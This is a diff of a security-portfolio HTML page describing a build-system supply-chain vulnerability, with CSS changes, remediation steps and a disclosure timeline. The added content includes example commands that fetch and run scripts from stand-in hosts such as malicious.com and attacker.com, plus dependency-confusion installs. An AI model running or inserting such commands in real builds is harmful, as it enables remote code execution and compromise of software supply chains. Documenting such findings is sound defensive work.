@@ -4,29 +4,21 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>INFRASTRUCTURE SUPPLY CHAIN - Featured Finding</title>
-    
-    <!-- NUCLEAR CSS - SAME AS ABOVE -->
+    <link rel="stylesheet" href="/css/security-analyzer.css">
     <style>
-        * {
-            all: unset;
-            box-sizing: border-box;
-        }
-        
         body {
-            background: #0a0a0a !important;
-            color: #00ff00 !important;
-            font-family: 'Courier New', monospace !important;
-            margin: 0 !important;
-            padding: 0 !important;
-            line-height: 1.6 !important;
-            min-height: 100vh !important;
+            background: #0a0a0a;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
         }
         
         .finding-container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 2rem;
-            background: #0a0a0a;
         }
         
         .terminal-header {
@@ -42,13 +34,15 @@
             margin-right: 2rem;
             text-transform: uppercase;
             font-weight: bold;
-            display: inline-block;
         }
         
-        h1, h2, h3, h4, h5, h6 {
+        .terminal-header nav a:hover {
+            text-decoration: underline;
+        }
+        
+        h1, h2, h3 {
             text-shadow: 2px 2px 0px #ff00ff, -2px -2px 0px #00ffff;
             color: #00ff00;
-            margin: 1rem 0;
         }
         
         .case-study-preview {
@@ -65,9 +59,9 @@
         }
         
         pre {
-            background: #1a1a1a;
+            background: #1a1a1a !important;
             border: 1px solid #00cc00;
-            border-left: 4px solid #00ff00;
+            border-left: 4px solid #00ff00 !important;
             border-radius: 4px;
             padding: 1rem;
             overflow-x: auto;
@@ -76,7 +70,6 @@
             max-width: 100%;
             position: relative;
             color: #00ff00;
-            margin: 1rem 0;
         }
         
         pre::before {
@@ -102,6 +95,13 @@
             color: #00ff00;
         }
         
+        .terminal-footer {
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid #00ff00;
+            margin-top: 4rem;
+        }
+        
         .meta-info {
             background: rgba(0, 255, 0, 0.1);
             padding: 1rem;
@@ -115,43 +115,6 @@
             font-weight: bold;
         }
         
-        .terminal-footer {
-            text-align: center;
-            padding: 2rem;
-            border-top: 1px solid #00ff00;
-            margin-top: 4rem;
-        }
-        
-        ul, ol {
-            background: #050505;
-            padding: 1rem 2rem;
-            border-radius: 4px;
-            border: 1px solid #00cc00;
-            margin: 1rem 0;
-        }
-        
-        li {
-            margin: 0.5rem 0;
-            color: #00ff00;
-            display: list-item;
-        }
-        
-        p {
-            color: #00ff00;
-            margin: 1rem 0;
-            display: block;
-        }
-        
-        a {
-            color: #00ff00;
-            text-decoration: underline;
-            cursor: pointer;
-        }
-        
-        a:hover {
-            color: #ffff00;
-        }
-        
         blockquote {
             border-left: 4px solid #00ff00;
             padding-left: 1rem;
@@ -160,7 +123,17 @@
             background: rgba(0, 255, 0, 0.05);
             padding: 1rem;
             border-radius: 4px;
-            color: #00ff00;
+        }
+        
+        ul, ol {
+            background: #050505;
+            padding: 1rem 2rem;
+            border-radius: 4px;
+            border: 1px solid #00cc00;
+        }
+        
+        li {
+            margin: 0.5rem 0;
         }
         
         .typewriter {
@@ -181,10 +154,15 @@
             50% { border-color: #00ff00; }
         }
         
-        .subtitle {
-            font-size: 1.2rem;
-            color: #00cc00;
-            margin-bottom: 2rem;
+        @media (max-width: 768px) {
+            .finding-container {
+                padding: 1rem;
+            }
+            
+            .terminal-header nav a {
+                display: block;
+                margin: 0.5rem 0;
+            }
         }
     </style>
 </head>
@@ -204,8 +182,8 @@
             <div class="meta-info">
                 <strong>DATE:</strong> 2024-11-01 | 
                 <strong>AUTHOR:</strong> Tyreek Haynes | 
-                <strong class="critical">SEVERITY: CRITICAL</strong> | 
-                <strong>CVSS: 9.0</strong>
+                <strong class="critical">SEVERITY: HIGH</strong> | 
+                <strong>CVSS: 8.7</strong>
             </div>
 
             <h1 class="typewriter">INFRASTRUCTURE SUPPLY CHAIN</h1>
@@ -213,74 +191,100 @@
 
             <div class="case-study-preview">
                 <h2>🚨 EXECUTIVE SUMMARY</h2>
-                <pre>> SYSTEM STATUS: COMPROMISED
-> ATTACK VECTOR: SUPPLY CHAIN  
-> BUSINESS IMPACT: OPERATIONAL + FINANCIAL</pre>
+                <pre>> BUILD SYSTEM: COMPROMISED
+> SUPPLY CHAIN: VULNERABLE  
+> IMPACT: ARBITRARY CODE EXECUTION</pre>
                 
-                <p>Comprehensive infrastructure and supply chain security assessment revealing multiple critical vulnerabilities across cloud infrastructure, third-party services, and network architecture.</p>
+                <p>Discovered critical vulnerability in build system infrastructure allowing attackers to inject and execute arbitrary code during the build process, compromising the entire software supply chain.</p>
             </div>
 
             <div class="case-study-preview">
                 <h2>🔧 TECHNICAL BREAKDOWN</h2>
                 
-                <h3>RESOURCE EXHAUSTION ATTACK</h3>
-                <pre><code># AWS COST INFLATION VECTOR
-while true; do
-  curl "https://target.com/invalid-auth-endpoint"
-  # Generates: UUID + Session + Analytics + CDN costs
-done</code></pre>
+                <h3>BUILD PROCESS INJECTION</h3>
+                <pre><code># Build script command injection
+./build.sh --target="$(curl -s http://malicious.com/payload.sh | sh)"
 
-                <h3>SUPPLY CHAIN COMPROMISE</h3>
-                <pre><code># CLOUD STORAGE MISCONFIGURATION
-curl "https://storage.cloudprovider.com/target-documents/"
-# Returns: Internal documents and configurations
+# Environment variable manipulation  
+MALICIOUS_PAYLOAD="curl http://malicious.com/backdoor | sh" make build
 
-# EXTERNAL FORM HANDLER EXPLOITATION
-curl -X POST "https://third-party-form.com/submit" -d "sensitive=data"</code></pre>
+# Dependency confusion attack
+pip install malicious-package==1.0.0
+npm install @hacker/backdoor</code></pre>
+
+                <h3>ATTACK SURFACE</h3>
+                <ul>
+                    <li>❌ <strong>Build Scripts</strong>: Command injection vulnerabilities</li>
+                    <li>❌ <strong>CI/CD Pipelines</strong>: Unrestricted build permissions</li>
+                    <li>❌ <strong>Package Managers</strong>: Dependency confusion</li>
+                    <li>❌ <strong>Artifact Repositories</strong>: Malicious uploads</li>
+                    <li>❌ <strong>Environment Variables</strong>: Unsanitized input</li>
+                </ul>
             </div>
 
             <div class="case-study-preview">
-                <h2>🎯 BUSINESS IMPACT</h2>
+                <h2>🎯 EXPLOITATION SCENARIOS</h2>
                 
-                <h3>FINANCIAL CONSEQUENCES</h3>
-                <ul>
-                    <li>AWS infrastructure cost inflation through abuse</li>
-                    <li>Third-party licensing fee waste</li>
-                    <li>Analytics data pollution affecting business decisions</li>
-                    <li>Security response overhead costs</li>
-                </ul>
+                <h3>MALICIOUS DEPLOYMENT</h3>
+                <pre><code class="language-bash"># Inject backdoor into production build
+echo "curl http://attacker.com/shell | bash" >> build.sh
+# Compromise production deployment
+./deploy.sh --environment=production --inject-payload</code></pre>
 
-                <h3>OPERATIONAL RISKS</h3>
+                <h3>DATA COMPROMISE</h3>
                 <ul>
-                    <li>DNS cache poisoning affecting service availability</li>
-                    <li>SMTP internal email spoofing for social engineering</li>
-                    <li>Network service vulnerabilities enabling lateral movement</li>
-                    <li>Third-party dependency chain compromise</li>
+                    <li>Extract build secrets and API keys</li>
+                    <li>Access source code repositories</li>
+                    <li>Compromise artifact storage</li>
+                    <li>Modify production binaries</li>
+                    <li>Steal intellectual property</li>
                 </ul>
             </div>
 
             <div class="case-study-preview">
                 <h2>🛡️ REMEDIATION PROTOCOL</h2>
                 
-                <h3>IMMEDIATE ACTIONS</h3>
+                <h3>EMERGENCY ACTIONS</h3>
                 <ol>
-                    <li><strong>COST CONTROL</strong>: Implement resource usage monitoring</li>
-                    <li><strong>SUPPLY CHAIN</strong>: Conduct third-party security assessments</li>
-                    <li><strong>INFRASTRUCTURE</strong>: Harden network services</li>
-                    <li><strong>DEFENSE</strong>: Deploy defense-in-depth controls</li>
+                    <li><strong>IMMEDIATE</strong>: Halt automated builds and deployments</li>
+                    <li><strong>SHORT-TERM</strong>: Implement build integrity verification</li>
+                    <li><strong>LONG-TERM</strong>: Secure CI/CD pipeline with signed artifacts</li>
                 </ol>
 
-                <h3>ARCHITECTURE HARDENING</h3>
-                <pre><code>// INFRASTRUCTURE AS CODE SECURITY
-resource "aws_cloudwatch_alarm" "cost_anomaly" {
-  alarm_name = "API-Cost-Anomaly"
-  threshold = 1000
-}
-
-resource "aws_waf_rule" "resource_abuse" {
-  name = "PreventResourceExhaustion"
-  metric_name = "ResourceAbuse"
-}</code></pre>
+                <h3>SECURE BUILD CONFIGURATION</h3>
+                <pre><code class="language-yaml"># Secure CI/CD pipeline
+build:
+  steps:
+    - name: Validate build environment
+      run: |
+        verify_build_scripts
+        validate_dependencies
+        check_environment_vars
+    - name: Build with integrity checks
+      run: |
+        build_with_verification
+        generate_build_manifest
+        sign_artifacts</code></pre>
             </div>
 
-            <
+            <div class="case-study-preview">
+                <h2>📅 DISCLOSURE TIMELINE</h2>
+                <pre><code>2024-11-01 16:20 | Vulnerability discovered
+2024-11-01 16:35 | Build system halted  
+2024-11-01 19:00 | Security controls implemented
+2024-11-02 10:00 | Supply chain audit completed</code></pre>
+            </div>
+
+            <div class="case-study-preview">
+                <blockquote>
+                    <strong>Supply chain attacks represent one of the most critical threats to modern infrastructure, allowing attackers to compromise systems at the source before they even reach production.</strong>
+                </blockquote>
+            </div>
+        </main>
+
+        <footer class="terminal-footer">
+            <p>// SECURITY RESEARCH PORTFOLIO //</p>
+        </footer>
+    </div>
+</body>
+</html>
